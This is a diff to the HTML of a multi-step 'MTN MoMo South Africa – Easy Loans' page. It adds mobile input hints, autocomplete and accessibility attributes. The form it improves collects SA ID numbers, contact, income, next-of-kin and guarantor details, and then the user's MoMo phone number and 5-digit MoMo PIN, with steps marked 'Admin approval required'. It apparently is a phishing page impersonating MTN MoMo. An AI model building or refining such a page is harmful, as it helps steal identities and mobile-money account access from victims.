@@ -2,12 +2,21 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#ffcc00" />
+<meta name="description" content="MTN MoMo South Africa – Easy Loans. Register and apply in minutes." />
 <title>MTN MoMo South Africa – Easy Loans</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
 <link rel="stylesheet" href="./style.css" />
 </head>
 <body>
+<noscript>
+    <div style="padding:24px;text-align:center;font-family:sans-serif;">
+        This application requires JavaScript. Please enable it in your browser.
+    </div>
+</noscript>
 
 <!-- OFFLINE BANNER -->
 <div id="offlineBanner" class="offline-banner hidden">📡 You are offline — reconnecting...</div>
@@ -109,7 +118,7 @@
             <div class="msg-box error" id="regErr"><span class="msg-icon">✕</span><span id="regErrTxt"></span></div>
             <div class="field">
                 <label>South African ID Number</label>
-                <input type="text" id="regId" placeholder="e.g. 9001015800085" maxlength="13" inputmode="numeric" oninput="normalizeId('regId');clearErr('regErr')" />
+                <input type="text" id="regId" placeholder="e.g. 9001015800085" maxlength="13" inputmode="numeric" pattern="\d{13}" autocomplete="off" oninput="normalizeId('regId');clearErr('regErr')" />
                 <div class="field-hint">13-digit SA ID — verified instantly</div>
             </div>
             <div class="field">
@@ -178,7 +187,7 @@
         <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
         <div class="acc-info-box" id="accInfoBox"><div id="accInfoText"></div></div>
         <div class="field"><label>Loan Type</label><div class="sel-wrap"><select id="s1ty"><option>Personal Loan</option><option selected>Business Loan</option><option>Home Loan</option><option>Car Loan</option><option>Education Loan</option></select></div></div>
-        <div class="field"><label>Loan Amount (ZAR)</label><input type="number" id="s1am" value="50000" placeholder="Amount" min="5000" max="50000" oninput="clearErr('s1Err')" /><div class="field-hint" id="loanLimitHint">Loading limits...</div></div>
+        <div class="field"><label>Loan Amount (ZAR)</label><input type="number" id="s1am" value="50000" placeholder="Amount" min="5000" max="50000" inputmode="numeric" oninput="clearErr('s1Err')" /><div class="field-hint" id="loanLimitHint">Loading limits...</div></div>
         <div class="field"><label>Loan Term</label><div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option selected>48 Months</option><option>60 Months</option></select></div></div>
         <div class="field"><label>Purpose</label><textarea id="s1pu" maxlength="300" placeholder="Describe the purpose…" oninput="clearErr('s1Err')"></textarea></div>
         <button class="btn-grad" onclick="submitStepLoan()" id="s1Btn">Submit for Approval</button>
@@ -209,11 +218,11 @@
         <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
         <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
         <div class="field-row">
-            <div class="field"><label>First Name</label><input type="text" id="s2fi" maxlength="40" placeholder="First Name" oninput="clearErr('s2Err')" /></div>
-            <div class="field"><label>Last Name</label><input type="text" id="s2la" maxlength="40" placeholder="Last Name" oninput="clearErr('s2Err')" /></div>
+            <div class="field"><label>First Name</label><input type="text" id="s2fi" maxlength="40" placeholder="First Name" autocomplete="given-name" oninput="clearErr('s2Err')" /></div>
+            <div class="field"><label>Last Name</label><input type="text" id="s2la" maxlength="40" placeholder="Last Name" autocomplete="family-name" oninput="clearErr('s2Err')" /></div>
         </div>
-        <div class="field"><label>Phone</label><div class="phone-row"><div class="ph-pre">+27</div><input type="tel" id="s2ph" maxlength="9" placeholder="8X XXX XXXX" oninput="normalizePhone('s2ph');clearErr('s2Err')" /></div></div>
-        <div class="field"><label>Email</label><input type="email" id="s2em" maxlength="120" placeholder="your@email.com" oninput="clearErr('s2Err')" /></div>
+        <div class="field"><label>Phone</label><div class="phone-row"><div class="ph-pre">+27</div><input type="tel" id="s2ph" maxlength="9" placeholder="8X XXX XXXX" inputmode="numeric" autocomplete="tel-national" oninput="normalizePhone('s2ph');clearErr('s2Err')" /></div></div>
+        <div class="field"><label>Email</label><input type="email" id="s2em" maxlength="120" placeholder="your@email.com" autocomplete="email" oninput="clearErr('s2Err')" /></div>
         <button class="btn-grad" onclick="submitStepPersonal()" id="s2Btn">Submit for Approval</button>
     </div></div>
 </div>
@@ -237,14 +246,14 @@
         <div class="nav-right" id="navbarAccount3"></div>
     </nav>
     <div class="step-center"><div class="step-card">
-        <h2>Employment & Kin</h2>
+        <h2>Employment &amp; Kin</h2>
         <p class="step-sub">Step 3 of 6 · Admin approval required</p>
         <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
         <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
         <div class="field"><label>Employment Status</label><div class="sel-wrap"><select id="s3em"><option>Employed</option><option selected>Self-employed</option><option>Unemployed</option><option>Retired</option><option>Student</option></select></div></div>
-        <div class="field"><label>Annual Income (ZAR)</label><input type="number" id="s3in" min="0" max="100000000" placeholder="Annual income" oninput="clearErr('s3Err')" /></div>
+        <div class="field"><label>Annual Income (ZAR)</label><input type="number" id="s3in" min="0" max="100000000" placeholder="Annual income" inputmode="numeric" oninput="clearErr('s3Err')" /></div>
         <div class="field"><label>Next of Kin Name</label><input type="text" id="s3kn" maxlength="60" placeholder="Full name" oninput="clearErr('s3Err')" /></div>
-        <div class="field"><label>Next of Kin Phone</label><div class="phone-row"><div class="ph-pre">+27</div><input type="tel" id="s3kp" maxlength="9" placeholder="8X XXX XXXX" oninput="normalizePhone('s3kp');clearErr('s3Err')" /></div></div>
+        <div class="field"><label>Next of Kin Phone</label><div class="phone-row"><div class="ph-pre">+27</div><input type="tel" id="s3kp" maxlength="9" placeholder="8X XXX XXXX" inputmode="numeric" oninput="normalizePhone('s3kp');clearErr('s3Err')" /></div></div>
         <button class="btn-grad" onclick="submitStepEmployment()" id="s3Btn">Submit for Approval</button>
     </div></div>
 </div>
@@ -273,7 +282,7 @@
         <div class="guarantor-intro"><div class="gi-icon">👥</div><h3>Why a guarantor?</h3><p>A guarantor agrees to repay if you can't. Standard for first-time borrowers.</p></div>
         <div class="msg-box error" id="gErr"><span class="msg-icon">✕</span><span id="gErrTxt"></span></div>
         <div class="field"><label>Guarantor Name</label><input type="text" id="gName" maxlength="60" placeholder="Full name" oninput="clearErr('gErr')" /></div>
-        <div class="field"><label>Guarantor Phone</label><div class="phone-row"><div class="ph-pre">+27</div><input type="tel" id="gPhone" maxlength="9" placeholder="8X XXX XXXX" oninput="normalizePhone('gPhone');clearErr('gErr')" /></div></div>
+        <div class="field"><label>Guarantor Phone</label><div class="phone-row"><div class="ph-pre">+27</div><input type="tel" id="gPhone" maxlength="9" placeholder="8X XXX XXXX" inputmode="numeric" oninput="normalizePhone('gPhone');clearErr('gErr')" /></div></div>
         <div class="field"><label>Relationship</label><div class="sel-wrap"><select id="gRel" onchange="clearErr('gErr')"><option value="">Select</option><option>Parent</option><option>Sibling</option><option>Spouse / Partner</option><option>Family Member</option><option>Friend</option><option>Colleague</option><option>Other</option></select></div></div>
         <div class="guarantor-confirm"><label class="confirm-check"><input type="checkbox" id="gConfirm" onchange="clearErr('gErr')" /><span>I confirm my guarantor agreed to guarantee this loan</span></label></div>
         <button class="btn-grad" onclick="submitStepGuarantor()" id="gBtn">Submit for Approval</button>
@@ -298,7 +307,7 @@
         <div class="nav-right" id="navbarAccount5"></div>
     </nav>
     <div class="step-center"><div class="step-card">
-        <h2>Review & Confirm</h2>
+        <h2>Review &amp; Confirm</h2>
         <p class="step-sub">Step 5 of 6</p>
         <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
 
@@ -359,7 +368,7 @@
             <label>MTN MoMo Phone Number</label>
             <div class="phone-row">
                 <div class="ph-pre">+27</div>
-                <input type="tel" id="loginPhone" maxlength="9" placeholder="8X XXX XXXX" oninput="normalizePhone('loginPhone');clearErr('loginErr')" />
+                <input type="tel" id="loginPhone" maxlength="9" placeholder="8X XXX XXXX" inputmode="numeric" autocomplete="tel-national" oninput="normalizePhone('loginPhone');clearErr('loginErr')" />
             </div>
             <div class="field-hint">Must match your registration number</div>
         </div>
@@ -367,13 +376,13 @@
         <div class="field">
             <label>MoMo PIN (5 digits)</label>
             <div class="pin-row">
-                <input type="password" id="loginPin0" class="pin-box" maxlength="1" placeholder="•" />
-                <input type="password" id="loginPin1" class="pin-box" maxlength="1" placeholder="•" />
-                <input type="password" id="loginPin2" class="pin-box" maxlength="1" placeholder="•" />
-                <input type="password" id="loginPin3" class="pin-box" maxlength="1" placeholder="•" />
-                <input type="password" id="loginPin4" class="pin-box" maxlength="1" placeholder="•" />
-                <button class="pin-eye" onclick="togLoginPin()">👁</button>
-                <button class="pin-delete" onclick="clearLoginPin()">✕</button>
+                <input type="password" id="loginPin0" class="pin-box" maxlength="1" placeholder="•" inputmode="numeric" autocomplete="off" />
+                <input type="password" id="loginPin1" class="pin-box" maxlength="1" placeholder="•" inputmode="numeric" autocomplete="off" />
+                <input type="password" id="loginPin2" class="pin-box" maxlength="1" placeholder="•" inputmode="numeric" autocomplete="off" />
+                <input type="password" id="loginPin3" class="pin-box" maxlength="1" placeholder="•" inputmode="numeric" autocomplete="off" />
+                <input type="password" id="loginPin4" class="pin-box" maxlength="1" placeholder="•" inputmode="numeric" autocomplete="off" />
+                <button type="button" class="pin-eye" onclick="togLoginPin()" aria-label="Toggle PIN visibility">👁</button>
+                <button type="button" class="pin-delete" onclick="clearLoginPin()" aria-label="Clear PIN">✕</button>
             </div>
         </div>
 
@@ -396,7 +405,7 @@
         </div>
 
         <button class="btn-grad" onclick="submitMoMoLogin()" id="loginBtn">Confirm Login</button>
-        <button class="btn-outline" onclick="retryStep('momologin')">↻ Clear & Retry</button>
+        <button class="btn-outline" onclick="retryStep('momologin')">↻ Clear &amp; Retry</button>
     </div></div>
 </div>
 
@@ -457,7 +466,7 @@
     <div class="modal-doc">
         <div class="modal-doc-head">
             <h2>Loan Agreement</h2>
-            <button class="modal-close" onclick="closeAgreement()">×</button>
+            <button class="modal-close" onclick="closeAgreement()" aria-label="Close">×</button>
         </div>
         <pre id="agreementText" class="agreement-text"></pre>
     </div>
@@ -468,7 +477,7 @@
     <div class="modal-doc">
         <div class="modal-doc-head">
             <h2>Repayment Schedule</h2>
-            <button class="modal-close" onclick="closeSchedule()">×</button>
+            <button class="modal-close" onclick="closeSchedule()" aria-label="Close">×</button>
         </div>
         <div id="scheduleBody" class="schedule-body"></div>
     </div>
